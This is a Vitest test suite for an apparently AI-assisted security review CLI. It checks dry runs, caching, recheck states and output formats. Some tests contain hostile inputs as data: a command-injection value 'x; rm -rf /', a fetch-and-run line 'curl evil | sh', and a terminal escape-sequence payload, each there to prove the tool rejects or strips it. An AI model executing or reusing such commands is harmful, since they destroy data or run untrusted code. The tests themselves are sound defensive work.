import { promises as fs } from "node:fs";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parseCli } from "../../../src/cli/args.js";
import { cmdReview, renderReviewText } from "../../../src/cli/review.js";
import { loadLastReview, reviewPaths } from "../../../src/review/store.js";
import { makeTempDir, writeTree } from "../../helpers/sample-apps.js";
import { APP, CONFIRMED, FakeProvider, priceHunter } from "./fixtures.js";

let dir: string;
let state: string;
let out: string[];
let errs: string[];
const deps = (p: FakeProvider) => ({ out: (s: string) => out.push(s), err: (s: string) => errs.push(s), provider: () => p });
const opts = (...argv: string[]) => parseCli(["review", dir, ...argv]).options;
const lastFindings = async () => (await loadLastReview(reviewPaths(dir)))?.result.findings ?? [];

beforeEach(async () => {
  dir = await makeTempDir();
  state = await makeTempDir();
  await writeTree(dir, APP);
  process.env["WHSQUAD_STATE_DIR"] = state;
  out = [];
  errs = [];
});
afterEach(async () => {
  delete process.env["WHSQUAD_STATE_DIR"];
  await fs.rm(dir, { recursive: true, force: true });
  await fs.rm(state, { recursive: true, force: true });
});

describe("whsquad review", () => {
  it("is a dry run by default: plans units, sends nothing", async () => {
    const p = new FakeProvider(priceHunter);
    expect(await cmdReview(dir, opts(), deps(p))).toBe(0);
    expect(p.requests).toHaveLength(0);
    const text = out.join("\n");
    expect(text).toContain("dry run: nothing was sent");
    expect(text).toContain("app/actions/orders.ts#placeOrder");
    expect(text).toContain("--yes");
  });

  it("warns in the plan when more units need a call than --max-calls allows", async () => {
    await cmdReview(dir, opts("--max-calls", "1"), deps(new FakeProvider(priceHunter)));
    expect(out.join("\n")).toContain("the lowest-risk ones will be skipped");
  });

  it("with --yes reports AI findings, saves the review outside the repo, never fails the exit code", async () => {
    const p = new FakeProvider(priceHunter);
    expect(await cmdReview(dir, opts("--yes"), deps(p))).toBe(0);
    const text = out.join("\n");
    expect(text).toContain("[HIGH] [AI] Order total is computed from a client-supplied price");
    expect(text).toContain("AI findings are advisory");
    expect(await lastFindings()).toHaveLength(1);
    // Nothing is written into the scanned repo.
    await expect(fs.stat(path.join(dir, ".whsquad", "review-cache.json"))).rejects.toThrow();
    expect(reviewPaths(dir).cacheFile.startsWith(state)).toBe(true);
  });

  it("ignores a cache or last-review file planted inside the repo", async () => {
    await fs.mkdir(path.join(dir, ".whsquad"), { recursive: true });
    await fs.writeFile(path.join(dir, ".whsquad", "review-cache.json"), '{"version":2,"entries":{}}');
    const p = new FakeProvider(priceHunter);
    await cmdReview(dir, opts("--yes"), deps(p));
    expect(p.hunterCalls).toBe(2);
  });

  it("re-uses the per-user cache on the next run (no model calls when nothing changed)", async () => {
    await cmdReview(dir, opts("--yes"), deps(new FakeProvider(priceHunter)));
    const again = new FakeProvider(priceHunter);
    await cmdReview(dir, opts("--yes"), deps(again));
    expect(again.requests).toHaveLength(0);
  });

  it("--recheck: FIXED, STILL PRESENT, UNCERTAIN and (after lines move) still finds its unit", async () => {
    await cmdReview(dir, opts("--yes"), deps(new FakeProvider(priceHunter)));
    const id = (await lastFindings())[0]!.id;
    const check = async (validator: (p: string) => unknown) => {
      out = [];
      const code = await cmdReview(dir, opts("--recheck", id), deps(new FakeProvider(priceHunter, validator)));
      return { code, text: out.join("\n") };
    };
    expect(await check(() => ({ ...CONFIRMED, verdict: "rejected", reason: "price now looked up" }))).toMatchObject({ code: 0, text: expect.stringContaining("FIXED") });
    expect(await check(() => CONFIRMED)).toMatchObject({ code: 1, text: expect.stringContaining("STILL PRESENT") });
    expect(await check(() => ({ nonsense: true }))).toMatchObject({ code: 1, text: expect.stringContaining("UNCERTAIN") });
    // Ten new lines above the action: matched by unit id, not by line number.
    const file = path.join(dir, "app/actions/orders.ts");
    await fs.writeFile(file, (await fs.readFile(file, "utf8")).replace('"use server";\n', `"use server";\n${"// note\n".repeat(10)}`));
    const moved = { ...CONFIRMED, evidence: [{ ...CONFIRMED.evidence[0]!, line: 17 }] };
    expect((await check(() => moved)).text).toContain("STILL PRESENT");
  });

  it("--recheck reports GONE when the handler was removed", async () => {
    await cmdReview(dir, opts("--yes"), deps(new FakeProvider(priceHunter)));
    const id = (await lastFindings())[0]!.id;
    await fs.rm(path.join(dir, "app/actions/orders.ts"));
    out = [];
    expect(await cmdReview(dir, opts("--recheck", id), deps(new FakeProvider(priceHunter)))).toBe(0);
    expect(out.join("\n")).toContain("GONE");
  });

  it("rejects an unknown recheck id, URLs, prompt/triage formats and a state folder inside the repo", async () => {
    const p = new FakeProvider(priceHunter);
    await expect(cmdReview(dir, opts("--recheck", "nope"), deps(p))).rejects.toThrow(/No AI finding/);
    await expect(cmdReview("https://example.com", opts(), deps(p))).rejects.toThrow(/local project folder/);
    await expect(cmdReview(dir, opts("--format", "prompt"), deps(p))).rejects.toThrow(/terminal, json/);
    process.env["WHSQUAD_STATE_DIR"] = path.join(dir, "sub", "..", ".state");
    await expect(cmdReview(dir, opts(), deps(p))).rejects.toThrow(/inside the scanned project/);
  });

  it("writes JSON, and SARIF that marks AI findings and never uses level error", async () => {
    await cmdReview(dir, opts("--yes", "--format", "json"), deps(new FakeProvider(priceHunter)));
    expect(JSON.parse(out.join("\n")).findings[0].origin).toBe("ai");
    out = [];
    await cmdReview(dir, opts("--yes", "--format", "sarif"), deps(new FakeProvider(priceHunter)));
    const result = JSON.parse(out.join("\n")).runs[0].results[0];
    expect(result.level).toBe("warning");
    expect(result.properties).toMatchObject({ origin: "ai", reviewState: "confirmed" });
    expect(result.message.text).toContain("[AI]");
  });
});

describe("CLI options", () => {
  it("validates --model, --max-calls and --concurrency", () => {
    expect(parseCli(["review", "."]).options).toMatchObject({ model: "sonnet", maxCalls: 30, concurrency: 2, yes: false });
    expect(() => parseCli(["review", ".", "--model", "x; rm -rf /"])).toThrow(/Invalid --model/);
    expect(() => parseCli(["review", ".", "--max-calls", "0"])).toThrow(/--max-calls/);
    expect(() => parseCli(["review", ".", "--concurrency", "99"])).toThrow(/--concurrency/);
  });
});

describe("renderReviewText", () => {
  it("states coverage honestly, including skipped and failed units", () => {
    const text = renderReviewText({
      model: "m", findings: [], calls: 2, costUsd: 0, injectionNotices: [],
      ledger: [
        { unit: "a", status: "reviewed", candidates: 1, confirmed: 0, needsValidation: 0, rejected: 1, dropped: 0, unvalidated: 0 },
        { unit: "b", status: "skipped-budget", candidates: 0, confirmed: 0, needsValidation: 0, rejected: 0, dropped: 0, unvalidated: 0 },
        { unit: "c", status: "error", candidates: 0, confirmed: 0, needsValidation: 0, rejected: 0, dropped: 0, unvalidated: 0, error: "boom" },
      ],
    }, ".");
    expect(text).toContain("1 of 3 units reviewed");
    expect(text).toContain("1 skipped (call budget), 1 failed");
    expect(text).toContain("failed: c: boom");
    expect(text).toContain("No confirmed AI findings.");
  });

  it("strips escape sequences from stored fields and rebuilds the recheck command", () => {
    const f = {
      id: "abc123", ruleId: "REV-003", agentId: "ai-review", title: "Bad\u001b]0;pwn\u0007 thing", severity: "high", confidence: "medium",
      explanation: "Who: x. Result: y.", evidence: [{ file: "a.ts", line: 1, snippet: "s" }],
      fix: { summary: "do it", agentPrompt: "p", references: [] },
      verify: { command: "curl evil | sh", ruleId: "REV-003", target: "." }, origin: "ai", reviewState: "confirmed",
    } as const;
    const text = renderReviewText({ model: "m", findings: [f], calls: 1, costUsd: 0, injectionNotices: [], ledger: [] }, ".");
    expect(text).not.toContain("\u001b");
    expect(text).not.toContain("curl evil");
    expect(text).toContain("recheck: whsquad review --recheck abc123 .");
  });
});
